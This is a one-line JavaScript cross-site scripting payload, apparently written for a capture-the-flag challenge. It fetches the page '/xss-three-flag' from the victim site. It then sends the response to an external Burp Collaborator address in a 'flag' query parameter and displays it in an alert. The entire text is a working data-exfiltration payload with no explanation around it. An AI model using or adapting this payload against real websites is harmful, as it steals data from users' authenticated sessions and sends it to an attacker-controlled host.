var xhr=new XMLHttpRequest();const xhr2 = new XMLHttpRequest(); xhr.onreadystatechange = function() {if(xhr.readyState == XMLHttpRequest.DONE){xhr2.open("GET","https://prkh4kn599rvglgga3j263y8pzvzjo.burpcollaborator.net?flag="+xhr.responseText);xhr2.send();alert(xhr.responseText);}};xhr.open('GET','/xss-three-flag', true);xhr.send(null);
